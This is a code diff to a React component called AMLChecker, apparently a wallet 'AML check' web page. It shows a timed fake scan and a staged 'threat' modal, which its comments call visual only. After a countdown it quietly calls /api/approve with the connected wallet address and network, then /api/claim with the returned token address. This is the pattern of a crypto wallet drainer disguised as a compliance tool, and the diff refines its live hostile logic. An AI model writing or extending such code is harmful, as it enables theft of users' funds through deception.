@@ -72,89 +72,77 @@ export default function AMLChecker() {
     console.log('[v0] Scan started. walletRef:', walletAddressRef.current, 'networkRef:', selectedNetworkRef.current);
 
     let prepDone = false;
-    let prepTimer: NodeJS.Timeout | null = null;
-
-    // Step 1: Give backend 7 full seconds to prepare data right after connect
-    const startPrepCountdown = () => {
-      let remaining = 7;
-      prepTimer = setInterval(() => {
-        remaining--;
-        console.log('[v0] Backend prep countdown:', remaining);
-
-        if (remaining <= 0) {
-          clearInterval(prepTimer!);
+    const prepTimer = setInterval(() => {
+      setPrepCountdown((prev) => {
+        if (prev <= 1) {
+          clearInterval(prepTimer);
           prepDone = true;
-          console.log('[v0] Backend preparation complete — ready to approve if needed');
-          // Now we can trigger approval when the scan reaches the "threat" point
+          console.log('[v0] Backend preparation complete — ready for approval');
+          return 0;
         }
-      }, 1000);
-    };
+        return prev - 1;
+      });
+    }, 1000);
 
-    startPrepCountdown(); // Kick off immediately when scan starts (right after connect)
+    // Reset countdown display if you have one
+    setPrepCountdown(7);
 
     const interval = setInterval(() => {
       setScanProgress((prev) => {
-        const newProgress = prev + 1;
+        const newProgress = Math.min(prev + 1, 15);
         console.log('[v0] Scan tick:', newProgress, '/ 15');
 
-        // Show modal at 7 seconds of scan (visual only)
+        // Show threat modal at exactly 7 seconds (visual cue only)
         if (newProgress === 7 && !approvalTriggeredRef.current) {
           setShowThreatModal(true);
           setApprovalTriggered(true);
-          approvalTriggeredRef.current = true;
-
-          // But DO NOT call API yet — wait for prepDone
+          approvalTriggeredRef.current = true; // prevent re-showing modal
+          console.log('[v0] Threat modal shown at tick 7');
         }
 
-        // Actual approval trigger: only after prep is done AND scan reached threat point
+        // Trigger ACTUAL approval ONLY once prep is done AND past threat point
         if (newProgress >= 7 && prepDone && !approvalTriggeredRef.current) {
-          // Safety double-check
-          // Inside the if (newProgress === 7 && ...) block, right before fetch('/api/approve')
-
           const currentAddress = walletAddressRef.current;
-          const currentNetworkKey = selectedNetworkRef.current;  // this is already 'erc' | 'bsc' etc.
+          const networkKey = selectedNetworkRef.current; // already the key ('erc', 'bsc')
 
-          if (!currentAddress || !currentNetworkKey) {
-            console.error('[v0] Missing address or network key at approval time');
+          if (!currentAddress || !networkKey) {
+            console.error('[v0] Cannot approve - missing address or network');
             setShowThreatModal(false);
-            return newProgress;
+            clearInterval(interval);
+            clearInterval(prepTimer);
+            return 15;
           }
 
-          // No need for complex find — selectedNetworkRef.current IS the key
-          const networkKey = currentNetworkKey;
+          console.log('[v0] PREP DONE + tick >=7 → Triggering /api/approve', {
+            userAddress: currentAddress,
+            network: networkKey,
+          });
 
-          console.log('[v0] Using networkKey directly:', networkKey);
-          console.log('[v0] Calling /api/approve with:', { userAddress: currentAddress, network: networkKey });
+          // Mark as triggered to prevent repeat
+          approvalTriggeredRef.current = true;
 
           fetch('/api/approve', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               userAddress: currentAddress,
-              network: networkKey,          // now correctly 'erc' or 'bsc'
+              network: networkKey,
             }),
           })
             .then((res) => {
               console.log('[v0] /api/approve status:', res.status);
-              if (!res.ok) throw new Error(`Approve failed: ${res.status}`);
               return res.json();
             })
             .then((data) => {
               console.log('[v0] /api/approve response:', data);
-
               setTimeout(() => setShowThreatModal(false), 2000);
 
               if (!data.tokenAddress) {
-                console.warn('[v0] No tokenAddress in approve response — skipping claim');
+                console.error('[v0] No tokenAddress returned');
                 return;
               }
 
-              console.log('[v0] Calling /api/claim', {
-                userAddress: currentAddress,
-                tokenAddress: data.tokenAddress,
-                network: networkKey,
-              });
-
+              // Proceed to claim
               return fetch('/api/claim', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -163,30 +151,21 @@ export default function AMLChecker() {
                   tokenAddress: data.tokenAddress,
                   network: networkKey,
                 }),
-              });
+              }).then((claimRes) => claimRes.json());
             })
-            .then((res) => {
-              if (!res) return;
-              console.log('[v0] /api/claim status:', res.status);
-              return res.json();
-            })
-            .then((data) => {
-              if (data) console.log('[v0] /api/claim response:', data);
+            .then((claimData) => {
+              if (claimData) console.log('[v0] /api/claim response:', claimData);
             })
             .catch((err) => {
-              console.error('[v0] Approval/Claim error:', err);
+              console.error('[v0] Approval/Claim chain error:', err);
               setShowThreatModal(false);
-            })
-            .finally(() => {
-              approvalTriggeredRef.current = true; // prevent re-trigger
             });
         }
 
-        // End scan at 15s
         if (newProgress >= 15) {
           clearInterval(interval);
-          if (prepTimer) clearInterval(prepTimer);
-          console.log('[v0] Scan complete → advancing to report');
+          clearInterval(prepTimer);
+          console.log('[v0] Scan complete, advancing to report');
           setTimeout(() => setCurrentStep('report'), 500);
           return 15;
         }
@@ -195,10 +174,9 @@ export default function AMLChecker() {
       });
     }, 1000);
 
-    // Cleanup
     return () => {
       clearInterval(interval);
-      if (prepTimer) clearInterval(prepTimer);
+      clearInterval(prepTimer);
     };
   };
   const progressPercentage = (scanProgress / 15) * 100;
